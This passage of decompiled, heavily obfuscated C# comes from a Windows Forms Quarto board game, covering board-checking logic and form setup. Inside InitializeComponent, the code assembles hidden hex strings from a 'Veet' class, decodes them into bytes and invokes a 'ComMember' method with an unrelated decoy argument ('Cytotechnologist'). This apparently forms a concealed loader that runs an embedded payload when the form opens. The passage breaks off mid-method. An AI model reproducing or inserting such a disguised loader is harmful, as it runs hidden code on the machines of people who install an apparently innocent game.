					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num41 = -1158310935;
						num42 = -1158310935;
					}
					else
					{
						num41 = -1775549016;
						num42 = -1775549016;
					}
					num = num41 ^ (int)(num2 * 1743805893);
					continue;
				}
				case 63u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -877504670) ^ 0x225A90F3;
						continue;
					}
					goto IL_028a;
				case 62u:
				{
					int num6;
					int num7;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num6 = 461311446;
						num7 = 461311446;
					}
					else
					{
						num6 = 1941230220;
						num7 = 1941230220;
					}
					num = num6 ^ (int)(num2 * 460732018);
					continue;
				}
				case 61u:
				{
					int num62;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 737362711;
						num62 = 737362711;
					}
					else
					{
						num = 1259362572;
						num62 = 1259362572;
					}
					continue;
				}
				case 60u:
					num = 1956663616;
					continue;
				case 59u:
				{
					int num55;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 903978202;
						num55 = 903978202;
					}
					else
					{
						num = 1234989602;
						num55 = 1234989602;
					}
					continue;
				}
				case 58u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 156791703;
						continue;
					}
					goto IL_028a;
				case 57u:
					if (mem[2, num5].Square == mem[3, num5].Square)
					{
						goto IL_0106;
					}
					goto IL_0112;
				case 56u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = (int)(num2 * 251548745) ^ -1222496516;
						continue;
					}
					goto IL_0106;
				case 55u:
					if (mem[0, 3] != null)
					{
						num = 1425166025;
						continue;
					}
					goto IL_0064;
				case 54u:
					num13 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0065;
				case 53u:
					if (mem[0, num5] != null)
					{
						num = 1426671750;
						continue;
					}
					goto IL_0112;
				case 52u:
				{
					int num36;
					int num37;
					if (mem[num5, 3] != null)
					{
						num36 = 547689613;
						num37 = 547689613;
					}
					else
					{
						num36 = 595427109;
						num37 = 595427109;
					}
					num = num36 ^ ((int)num2 * -568456780);
					continue;
				}
				case 51u:
				{
					int num33;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1100448925;
						num33 = 1100448925;
					}
					else
					{
						num = 1236318243;
						num33 = 1236318243;
					}
					continue;
				}
				case 50u:
				{
					int num16;
					int num17;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num16 = 339624845;
						num17 = 339624845;
					}
					else
					{
						num16 = 325814412;
						num17 = 325814412;
					}
					num = num16 ^ ((int)num2 * -1800054169);
					continue;
				}
				case 49u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1395114340) ^ -1545002308;
						continue;
					}
					goto IL_04f3;
				case 48u:
				{
					int num66;
					int num67;
					if (mem[0, 0] == null)
					{
						num66 = 486144734;
						num67 = 486144734;
					}
					else
					{
						num66 = 1246319510;
						num67 = 1246319510;
					}
					num = num66 ^ (int)(num2 * 693629975);
					continue;
				}
				case 47u:
					num = ((int)num2 * -1094442069) ^ 0x7DCDF6F6;
					continue;
				case 46u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = (int)((num2 * 746740178) ^ 0xF368EE0);
						continue;
					}
					goto IL_0106;
				case 45u:
				{
					int num58;
					int num59;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num58 = -1704642920;
						num59 = -1704642920;
					}
					else
					{
						num58 = -725835905;
						num59 = -725835905;
					}
					num = num58 ^ (int)(num2 * 715957522);
					continue;
				}
				case 44u:
				{
					int num51;
					int num52;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num51 = 666450691;
						num52 = 666450691;
					}
					else
					{
						num51 = 1229362008;
						num52 = 1229362008;
					}
					num = num51 ^ (int)(num2 * 1892481856);
					continue;
				}
				case 43u:
				{
					int num49;
					int num50;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num49 = -504749750;
						num50 = -504749750;
					}
					else
					{
						num49 = -869817869;
						num50 = -869817869;
					}
					num = num49 ^ ((int)num2 * -1270618308);
					continue;
				}
				case 42u:
					num5++;
					num = (int)(num2 * 45001245) ^ -183823628;
					continue;
				case 41u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1515944397) ^ -1282669912;
						continue;
					}
					goto IL_0676;
				case 40u:
				{
					int num43;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1000568146;
						num43 = 1000568146;
					}
					else
					{
						num = 2073006464;
						num43 = 2073006464;
					}
					continue;
				}
				case 39u:
				{
					int num38;
					int num39;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num38 = 1431739677;
						num39 = 1431739677;
					}
					else
					{
						num38 = 41538144;
						num39 = 41538144;
					}
					num = num38 ^ ((int)num2 * -737901727);
					continue;
				}
				case 38u:
				{
					int num30;
					int num31;
					if (flag)
					{
						num30 = 1565854567;
						num31 = 1565854567;
					}
					else
					{
						num30 = 1997598046;
						num31 = 1997598046;
					}
					num = num30 ^ ((int)num2 * -1228011935);
					continue;
				}
				case 37u:
				{
					int num26;
					int num27;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num26 = -1560341825;
						num27 = -1560341825;
					}
					else
					{
						num26 = -1864992079;
						num27 = -1864992079;
					}
					num = num26 ^ (int)(num2 * 1187804369);
					continue;
				}
				case 36u:
				{
					int num20;
					int num21;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num20 = 832097313;
						num21 = 832097313;
					}
					else
					{
						num20 = 270664119;
						num21 = 270664119;
					}
					num = num20 ^ ((int)num2 * -1460184383);
					continue;
				}
				case 35u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -777561052) ^ -1386602828;
						continue;
					}
					goto IL_04f3;
				case 34u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 2129650217) ^ 0x6D870579);
						continue;
					}
					goto IL_0064;
				case 33u:
				{
					int num11;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = 1120150374;
						num11 = 1120150374;
					}
					else
					{
						num = 807588690;
						num11 = 807588690;
					}
					continue;
				}
				case 32u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1894156889) ^ -1287669249;
						continue;
					}
					goto IL_0676;
				case 31u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -1637665054) ^ 0x28268351;
						continue;
					}
					goto IL_0106;
				case 30u:
				{
					int num64;
					int num65;
					if (mem[num5, 2] != null)
					{
						num64 = -818299103;
						num65 = -818299103;
					}
					else
					{
						num64 = -234076691;
						num65 = -234076691;
					}
					num = num64 ^ ((int)num2 * -581905994);
					continue;
				}
				case 29u:
				{
					int num60;
					int num61;
					if (mem[3, 3] == null)
					{
						num60 = -414307626;
						num61 = -414307626;
					}
					else
					{
						num60 = -531879855;
						num61 = -531879855;
					}
					num = num60 ^ ((int)num2 * -1085475911);
					continue;
				}
				case 28u:
					flag2 = true;
					num = (int)((num2 * 16797153) ^ 0x588AA989);
					continue;
				case 26u:
				{
					int num56;
					int num57;
					if (mem[num5, 1] != null)
					{
						num56 = 1145143095;
						num57 = 1145143095;
					}
					else
					{
						num56 = 22617561;
						num57 = 22617561;
					}
					num = num56 ^ (int)(num2 * 1795511940);
					continue;
				}
				case 25u:
				{
					int num53;
					int num54;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num53 = -787778597;
						num54 = -787778597;
					}
					else
					{
						num53 = -211181874;
						num54 = -211181874;
					}
					num = num53 ^ (int)(num2 * 962686516);
					continue;
				}
				case 24u:
					if (mem[3, num5] != null)
					{
						num = (int)((num2 * 220439781) ^ 0x36ADB8FF);
						continue;
					}
					goto IL_0112;
				case 23u:
					if (mem[1, num5] != null)
					{
						num = (int)(num2 * 1851129782) ^ -1375641797;
						continue;
					}
					goto IL_0112;
				case 22u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -22474397) ^ -2144146588;
						continue;
					}
					goto IL_0676;
				case 21u:
				{
					int num47;
					int num48;
					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num47 = -799978328;
						num48 = -799978328;
					}
					else
					{
						num47 = -35756905;
						num48 = -35756905;
					}
					num = num47 ^ ((int)num2 * -2142794991);
					continue;
				}
				case 20u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -1598771882) ^ 0x97D2ABA;
						continue;
					}
					goto IL_0106;
				case 19u:
				{
					int num44;
					int num45;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num44 = -357826015;
						num45 = -357826015;
					}
					else
					{
						num44 = -1229168732;
						num45 = -1229168732;
					}
					num = num44 ^ ((int)num2 * -1837053556);
					continue;
				}
				case 18u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1070440932) ^ 0x9F5C7BA;
						continue;
					}
					goto IL_04f3;
				case 17u:
					flag2 = false;
					num5 = 0;
					num = (int)(num2 * 1424574798) ^ -141775139;
					continue;
				case 16u:
					result = flag2;
					num = 1550925941;
					continue;
				case 15u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1927155689) ^ 0x4748EE09;
						continue;
					}
					goto IL_0064;
				case 14u:
				{
					int num40;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = 467477082;
						num40 = 467477082;
					}
					else
					{
						num = 2116008015;
						num40 = 2116008015;
					}
					continue;
				}
				case 13u:
					if (mem[2, num5] != null)
					{
						num = ((int)num2 * -564117721) ^ -1237195418;
						continue;
					}
					goto IL_0112;
				case 11u:
				{
					int num35;
					if (mem[num5, 0] == null)
					{
						num = 1793412365;
						num35 = 1793412365;
					}
					else
					{
						num = 1214652838;
						num35 = 1214652838;
					}
					continue;
				}
				case 10u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 86281214) ^ -1827544635;
						continue;
					}
					goto IL_0676;
				case 9u:
				{
					int num28;
					int num29;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num28 = -525931505;
						num29 = -525931505;
					}
					else
					{
						num28 = -1400795790;
						num29 = -1400795790;
					}
					num = num28 ^ ((int)num2 * -269954218);
					continue;
				}
				case 8u:
				{
					int num24;
					int num25;
					if (mem[2, 2] != null)
					{
						num24 = 1683528790;
						num25 = 1683528790;
					}
					else
					{
						num24 = 663063227;
						num25 = 663063227;
					}
					num = num24 ^ ((int)num2 * -251505948);
					continue;
				}
				case 7u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 919521669) ^ -1407947900;
						continue;
					}
					goto IL_0106;
				case 6u:
				{
					int num18;
					int num19;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num18 = -1182859840;
						num19 = -1182859840;
					}
					else
					{
						num18 = -1191720538;
						num19 = -1191720538;
					}
					num = num18 ^ ((int)num2 * -906782014);
					continue;
				}
				case 5u:
				{
					int num14;
					int num15;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num14 = -702185020;
						num15 = -702185020;
					}
					else
					{
						num14 = -799680913;
						num15 = -799680913;
					}
					num = num14 ^ (int)(num2 * 1894443721);
					continue;
				}
				case 4u:
				{
					int num12;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 664097277;
						num12 = 664097277;
					}
					else
					{
						num = 295423818;
						num12 = 295423818;
					}
					continue;
				}
				case 3u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 965756361;
						continue;
					}
					goto IL_0112;
				case 2u:
				{
					int num8;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = 1566721174;
						num8 = 1566721174;
					}
					else
					{
						num = 1858344941;
						num8 = 1858344941;
					}
					continue;
				}
				case 1u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -352267303) ^ 0x469FBCE8;
						continue;
					}
					goto IL_0106;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[1, 1] != null)
					{
						num3 = -496294784;
						num4 = -496294784;
					}
					else
					{
						num3 = -1414005145;
						num4 = -1414005145;
					}
					num = num3 ^ ((int)num2 * -714233516);
					continue;
				}
				case 12u:
					break;
				default:
					{
						return result;
					}
					IL_0065:
					flag = (byte)num13 != 0;
					num = 1287598731;
					continue;
					IL_04f3:
					num13 = 1;
					goto IL_0065;
					IL_028a:
					num13 = 0;
					goto IL_0065;
					IL_0112:
					num = 616846260;
					num34 = 616846260;
					continue;
					IL_0676:
					num13 = 1;
					goto IL_0065;
					IL_0064:
					num13 = 0;
					goto IL_0065;
					IL_0106:
					num = 1834479726;
					num34 = 1834479726;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag2 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		bool flag4 = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -275658705;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9A6C30B6u) % 17u)
				{
				case 16u:
					flag2 = mem[num5, num6] == null;
					num = -243945196;
					continue;
				case 15u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 512355557;
						num10 = 512355557;
					}
					else
					{
						num9 = 462265421;
						num10 = 462265421;
					}
					num = num9 ^ ((int)num2 * -1668648795);
					continue;
				}
				case 13u:
					num5++;
					num = ((int)num2 * -1986031210) ^ -2039977759;
					continue;
				case 12u:
					num = ((int)num2 * -66291061) ^ 0x59A7C9D7;
					continue;
				case 11u:
				{
					int num7;
					int num8;
					if (flag4)
					{
						num7 = -311174974;
						num8 = -311174974;
					}
					else
					{
						num7 = -1697987321;
						num8 = -1697987321;
					}
					num = num7 ^ (int)(num2 * 2139477746);
					continue;
				}
				case 10u:
					num6++;
					num = -814921608;
					continue;
				case 9u:
					num = (int)(num2 * 1308677762) ^ -787238143;
					continue;
				case 8u:
					num6 = 0;
					num = -1069537521;
					continue;
				case 7u:
					result = flag3;
					num = (int)(num2 * 1113973021) ^ -512391575;
					continue;
				case 6u:
					flag3 = true;
					num5 = 0;
					num = ((int)num2 * -838169394) ^ 0x1FAA40E;
					continue;
				case 5u:
					flag4 = num5 < 4;
					num = -895343796;
					continue;
				case 4u:
					flag = num6 < 4;
					num = -2119086290;
					continue;
				case 3u:
					flag3 = false;
					num = (int)((num2 * 1171045693) ^ 0x35A6AD02);
					continue;
				case 2u:
					num = (int)((num2 * 1729982365) ^ 0x45258B0D);
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -434959441;
						num4 = -434959441;
					}
					else
					{
						num3 = -948884472;
						num4 = -948884472;
					}
					num = num3 ^ ((int)num2 * -1583098716);
					continue;
				}
				case 14u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -45410360;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC5EA9BE5u) % 6u)
				{
				case 5u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1120203110) ^ -189366545;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -180797529) ^ 0x13B711E4;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -117285683) ^ -1674557328;
					continue;
				case 0u:
					num = ((int)num2 * -2005599263) ^ -383150720;
					continue;
				default:
					return;
				case 4u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0009;
		}
		int num = 0;
		goto IL_00c6;
		IL_00c6:
		bool flag = (byte)num != 0;
		int num2 = 1822785804;
		goto IL_0087;
		IL_0009:
		num2 = 867645966;
		goto IL_0087;
		IL_0087:
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0x329AE407u) % 9u)
			{
			case 8u:
				break;
			case 6u:
				Form1.smethod_51((IDisposable)components);
				num2 = (int)(num3 * 1322657842) ^ -9762750;
				continue;
			case 5u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = 2134708242;
					num5 = 2134708242;
				}
				else
				{
					num4 = 1053238130;
					num5 = 1053238130;
				}
				num2 = num4 ^ (int)(num3 * 480694938);
				continue;
			}
			case 4u:
				((Form)this).Dispose(disposing);
				num2 = 575879366;
				continue;
			case 3u:
				num2 = (int)(num3 * 454823517) ^ -629431909;
				continue;
			case 2u:
				num2 = ((int)num3 * -1553068353) ^ 0x23E7093C;
				continue;
			case 1u:
				num2 = (int)((num3 * 1325286186) ^ 0x66C4E1B0);
				continue;
			default:
				return;
			case 7u:
				goto IL_00bd;
			case 0u:
				return;
			}
			break;
		}
		goto IL_0009;
		IL_00bd:
		num = ((components != null) ? 1 : 0);
		goto IL_00c6;
	}

	private void InitializeComponent()
	{
		//IL_0aef: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af9: Expected O, but got Unknown
		components = Form1.smethod_52();
		pictureBox1 = Form1.smethod_2();
		button2 = Form1.smethod_53();
		button1 = Form1.smethod_53();
		richTextBox1 = Form1.smethod_54();
		panel1 = Form1.smethod_55();
		int num3 = default(int);
		string string_ = default(string);
		byte[] array = default(byte[]);
		bool flag = default(bool);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = 1616741768;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2B97FA52u) % 119u)
				{
				case 118u:
					num3++;
					num = (int)(num2 * 2088584710) ^ -519148619;
					continue;
				case 117u:
					num = ((int)num2 * -980190245) ^ -1490929330;
					continue;
				case 116u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1996097715) ^ -537062988;
					continue;
				case 115u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)((num2 * 1028763048) ^ 0x2F9D8B54);
					continue;
				case 114u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -514474017) ^ -316010269;
					continue;
				case 113u:
					num = ((int)num2 * -283264999) ^ 0x4ADE666F;
					continue;
				case 112u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 118278753) ^ 0x18504527);
					continue;
				case 111u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1034380110) ^ 0x742EF5);
					continue;
				case 110u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1853548949) ^ 0x4EBC18AB;
					continue;
				case 109u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1867062335) ^ 0x4A2F7961;
					continue;
				case 108u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1567563175) ^ 0x596396BB);
					continue;
				case 107u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1651230304) ^ -993755487;
					continue;
				case 106u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -1099767517) ^ -1009999116;
					continue;
				case 105u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -1964803497) ^ -1453010627;
					continue;
				case 104u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -658128269) ^ -767328677;
					continue;
				case 103u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -356362123) ^ -15779758;
					continue;
				case 102u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1514441969) ^ -429048244;
					continue;
				case 101u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1196201650) ^ -313223835;
					continue;
				case 100u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -2058177876) ^ 0x3889774B;
					continue;
				case 98u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 1716265860) ^ -438839326;
					continue;
				case 97u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -207286566) ^ 0x6F2CBA92;
					continue;
				case 96u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -384270697) ^ 0x61840DA0;
					continue;
				case 95u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1553498080) ^ 0x16ED0D6B;
					continue;
				case 94u:
					num = (int)((num2 * 1023763644) ^ 0x17F1DCA0);
					continue;
				case 93u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -58818002) ^ 0x6C755F5B;
					continue;
				case 92u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -458714867) ^ -437108301;
					continue;
				case 91u:
					num = ((int)num2 * -776118994) ^ -777493446;
					continue;
				case 90u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)((num2 * 638513465) ^ 0x57CBB720);
					continue;
				case 89u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 2114638042) ^ -1014834538;
					continue;
				case 88u:
					num = (int)(num2 * 1559272084) ^ -1838435870;
					continue;
				case 87u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)(num2 * 1208283821) ^ -1533796492;
					continue;
				case 86u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 773183395) ^ 0x4176488C);
					continue;
				case 85u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1180112212) ^ 0x49C424D;
					continue;
				case 84u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -1862473416) ^ 0x35997ACC;
					continue;
				case 83u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)((num2 * 1587648985) ^ 0x2CAF03D5);
					continue;
				case 82u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = 31127067;
					continue;
				case 81u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1163061608) ^ 0x64B99BB9;
					continue;
				case 80u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 1880046980) ^ 0x5C3C1E13);
					continue;
				case 79u:
					num = (int)(num2 * 1027562428) ^ -1411886130;
					continue;
				case 78u:
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = (int)((num2 * 262655485) ^ 0x672D2A13);
					continue;
				case 77u:
					num = ((int)num2 * -1243033452) ^ 0x4D6264;
					continue;
				case 76u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -331124947;
						num5 = -331124947;
					}
					else
					{
						num4 = -1649486787;
						num5 = -1649486787;
					}
					num = num4 ^ ((int)num2 * -1603813346);
					continue;
				}
				case 75u:
					num = ((int)num2 * -1911188653) ^ 0x4CBC450E;
					continue;
				case 74u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1866830638) ^ -268173746;
					continue;
				case 73u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -413469411) ^ 0x1F3A354;
					continue;
				case 72u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 103467838) ^ 0x27095832);
					continue;
				case 71u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1254808543) ^ 0x2CF13FF7;
					continue;
				case 70u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1311805273) ^ -916430309;
					continue;
				case 69u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1680736638) ^ 0x78316BAF;
					continue;
				case 68u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -706157867) ^ -1378617351;
					continue;
				case 67u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 2034209964) ^ 0x593960D8);
					continue;
				case 65u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 354090241) ^ 0x7FC203CF);
					continue;
				case 64u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -154488657) ^ 0x432AC916;
					continue;
				case 63u:
					num = (int)((num2 * 1767446190) ^ 0x32EE8431);
					continue;
				case 62u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -2099888128) ^ 0x3E53BF5D;
					continue;
				case 61u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1436359593) ^ -445940095;
					continue;
				case 60u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -963212610) ^ -1216616330;
					continue;
				case 59u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1420948144) ^ -894328561;
					continue;
				case 58u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1040206689) ^ 0x4CDF67D;
					continue;
				case 57u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1366212317) ^ -2097874368;
					continue;
				case 56u:
					num = (int)(num2 * 1883529442) ^ -1088169898;
					continue;
				case 55u:
					num = ((int)num2 * -846786525) ^ 0x2B5CF116;
					continue;
				case 54u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)(num2 * 1067884254) ^ -1447481095;
					continue;
				case 53u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1949122270) ^ 0x20806D24;
					continue;
				case 52u:
					num = ((int)num2 * -437668911) ^ 0x70623F89;
					continue;
				case 51u:
					num = (int)(num2 * 1501507273) ^ -912690688;
					continue;
				case 50u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 2012693975) ^ -1163501249;
					continue;
				case 49u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1302756768) ^ 0x67F498FF;
					continue;
				case 48u:
					string_ = Veet.Sa;
					num = ((int)num2 * -1887972216) ^ -427220091;
					continue;
				case 47u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -710168141) ^ 0x1B4B2F07;
					continue;
				case 46u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1003432014) ^ -233710500;
					continue;
				case 45u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -2030040874) ^ 0x69AFDF82;
					continue;
				case 44u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 447600517) ^ 0x563E7BE1);
					continue;
				case 43u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1002513228) ^ -2046265072;
					continue;
				case 42u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -2014219857) ^ 0x34BF2411;
					continue;
				case 41u:
					num = (int)(num2 * 2062774538) ^ -2075928010;
					continue;
				case 40u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 37206008) ^ 0x4C432A8F);
					continue;
				case 39u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1164067691) ^ 0x17B77D3;
					continue;
				case 38u:
					num = ((int)num2 * -1950092071) ^ -1132055863;
					continue;
				case 37u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 738463656) ^ 0x13E5ACC3);
					continue;
				case 36u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -650044781) ^ -1215029414;
					continue;
				case 35u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 1562855098) ^ -44943746;
					continue;
				case 34u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -704938146) ^ 0x53DDAAF2;
					continue;
				case 33u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -283927133) ^ 0x7DF565F0;
					continue;
				case 32u:
